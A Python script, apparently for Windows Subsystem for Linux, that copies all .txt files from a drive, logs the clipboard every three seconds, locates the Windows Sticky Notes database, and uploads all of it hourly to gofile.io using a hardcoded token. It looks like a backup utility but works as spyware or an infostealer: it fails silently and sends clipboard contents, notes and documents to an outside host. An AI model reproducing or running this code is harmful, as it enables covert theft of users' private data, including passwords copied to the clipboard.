import os 
import shutil
import time
import subprocess
import requests
from datetime import datetime
import threading

root_directory = "/mnt/d"
destination_directory = os.path.expanduser("~/dev/BackupTxtFiles")

os.makedirs(destination_directory, exist_ok=True)

for dirpath, dirnames, filenames in os.walk(root_directory):
    for filename in filenames:
        if filename.endswith(".txt"):
            source_file_path = os.path.join(dirpath, filename)
            destination_file_path = os.path.join(destination_directory, filename)
            
            if not os.path.exists(destination_file_path) or (
                os.path.getmtime(source_file_path) > os.path.getmtime(destination_file_path)
            ):
                try:
                    shutil.copy2(source_file_path, destination_file_path)
                except Exception as e:
                    pass

def get_clipboard_content():
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        return result.stdout.strip() if result.returncode == 0 else None
    except:
        return None

def log_clipboard_update(content, file_path):
    with open(file_path, 'a') as f:
        f.write(f"Time: {datetime.now()}\n{content}\n\n")

def upload_file(file_path, api_token):
    try:
        with open(file_path, "rb") as f:
            response = requests.post(
                "https://store9.gofile.io/uploadFile",
                files={"file": f},
                data={"token": api_token}
            )
    except Exception as e:
        pass

def calculate_directory_size(directory_path):
    total_size = 0
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                total_size += os.path.getsize(file_path)
    return total_size

def upload_directory_if_changed(directory_path, api_token):
    if not hasattr(upload_directory_if_changed, 'last_size'):
        upload_directory_if_changed.last_size = 0

    current_size = calculate_directory_size(directory_path)
    if current_size != upload_directory_if_changed.last_size:
        upload_directory_if_changed.last_size = current_size
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                upload_file(file_path, api_token)

def monitor_clipboard(file_path):
    last_content = ""
    while True:
        current_content = get_clipboard_content()
        if current_content and current_content != last_content:
            log_clipboard_update(current_content, file_path)
            last_content = current_content
        time.sleep(3)

def periodic_upload(files, directory, api_token):
    while True:
        for file_path in files:
            upload_file(file_path, api_token)
        upload_directory_if_changed(directory, api_token)
        time.sleep(3600)

def get_windows_username():
    try:
        result = subprocess.run(["powershell.exe", "-Command", "[System.Environment]::UserName"], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
    except:
        return ""
    return ""

if __name__ == '__main__':
    clipboard_log_path = os.path.expanduser("~/dev/ba.txt")
    windows_user = get_windows_username()
    
    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
    if not os.path.isfile(sticky_notes_path):
        pass

    api_token = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
    os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
    open(clipboard_log_path, 'a').close()

    files_to_upload = [clipboard_log_path, sticky_notes_path]
    backup_folder_path = destination_directory

    threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,)).start()
    threading.Thread(target=periodic_upload, args=(files_to_upload, backup_folder_path, api_token)).start()
